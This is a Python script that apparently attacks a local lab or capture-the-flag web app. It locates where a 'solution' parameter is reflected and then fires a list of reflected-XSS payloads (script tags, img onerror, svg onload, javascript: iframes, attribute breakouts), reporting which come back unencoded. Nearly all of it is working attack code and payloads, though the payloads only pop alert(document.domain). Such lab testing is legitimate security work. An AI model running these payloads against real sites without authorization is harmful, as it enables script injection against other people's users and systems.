import requests
import re

base_url = "http://127.0.0.1:33202"

print("="*80)
print("XSS ANALYSIS - Testing solution parameter reflection")
print("="*80)

# Step 1: Determine reflection context with marker
print("\n[*] Step 1: Finding injection context with marker")
marker = 'MARKER_TEST_999'
data = {'solution': marker}

try:
    resp = requests.post(f"{base_url}/page", data=data, timeout=10)
    print(f"Status: {resp.status_code}")
    
    pos = resp.text.find(marker)
    if pos == -1:
        print("[!] Marker not found - parameter might not be reflected")
        exit(1)
    
    print(f"[!] Marker found at position {pos}")
    
    # Show context around marker
    context_start = max(0, pos - 250)
    context_end = min(len(resp.text), pos + len(marker) + 250)
    context = resp.text[context_start:context_end]
    
    print(f"\nContext around marker:")
    print("-"*80)
    print(context)
    print("-"*80)
    
    # Determine if we're inside the input value attribute
    before_marker = resp.text[:pos]
    if 'value="' in before_marker[-50:]:
        print(f"\n[!] INJECTION CONTEXT: Inside value attribute")
        print(f"[!] We need to break out with: \"><script>alert(1)</script>")
        context_type = "value_attr"
    elif '<input' in before_marker[-100:]:
        print(f"\n[!] INJECTION CONTEXT: Near input element")
        context_type = "near_input"
    else:
        print(f"\n[!] INJECTION CONTEXT: Outside HTML tags")
        context_type = "outside_html"
        
except Exception as e:
    print(f"[!] Error: {e}")
    exit(1)

# Step 2: Test XSS payloads
print(f"\n\n[*] Step 2: Testing XSS payloads")
print("="*80)

# Test payloads (carefully escaped)
test_payloads = []

if context_type == "value_attr":
    # Need to break out of the value attribute
    test_payloads = [
        '"><script>alert(document.domain)</script>',
        '"><img src=x onerror=alert(document.domain)>',
        '"><svg/onload=alert(document.domain)>',
        '"><iframe src=javascript:alert(document.domain)>',
        '"><body onload=alert(document.domain)>',
        '" autofocus onfocus=alert(document.domain)>',
        '" onmouseover=alert(document.domain)>',
        '" onerror=alert(document.domain)>',
        '"></form><script>alert(document.domain)</script>',
    ]
else:
    # Can inject directly
    test_payloads = [
        '<script>alert(document.domain)</script>',
        '<img src=x onerror=alert(document.domain)>',
        '<svg/onload=alert(document.domain)>',
        '<iframe src=javascript:alert(document.domain)>',
        '<body onload=alert(document.domain)>',
    ]

success_count = 0
for i, payload in enumerate(test_payloads, 1):
    print(f"\nTest {i:2d}: {payload}")
    print("-"*80)
    
    data = {'solution': payload}
    try:
        resp = requests.post(f"{base_url}/page", data=data, timeout=10)
        
        # Check if payload is reflected without encoding
        if payload in resp.text:
            print(f"[!] REFLECTED UNENCODED!")
            success_count += 1
            
            # Find position and show context
            pos = resp.text.find(payload)
            start = max(0, pos - 150)
            end = min(len(resp.text), pos + len(payload) + 150)
            context = resp.text[start:end]
            
            print(f"Context:")
            print(context)
            print(f"\n[+] Potential XSS vector - payload not encoded")
            
            # Check if HTML tags would execute
            if '<script>' in payload or '<img' in payload or '<svg' in payload:
                print(f"[!] HTML TAGS PRESENT - XSS likely to execute!")
                
        elif payload.replace('<', '&lt;').replace('>', '&gt;') in resp.text:
            print(f"[-] Payload is HTML-encoded (safe)")
        else:
            print(f"[-] Payload not reflected")
            
    except Exception as e:
        print(f"[!] Error: {e}")

# Step 3: Summary
print(f"\n{'='*80}")
print(f"SUMMARY: {success_count}/{len(test_payloads)} payloads reflected unencoded")
print("="*80)

if success_count > 0:
    print(f"\n[+] XSS likely possible!")
    print(f"[+] The solution parameter is vulnerable to XSS")
else:
    print(f"\n[-] No unencoded reflections found")
    print(f"[-] XSS may be blocked by encoding")
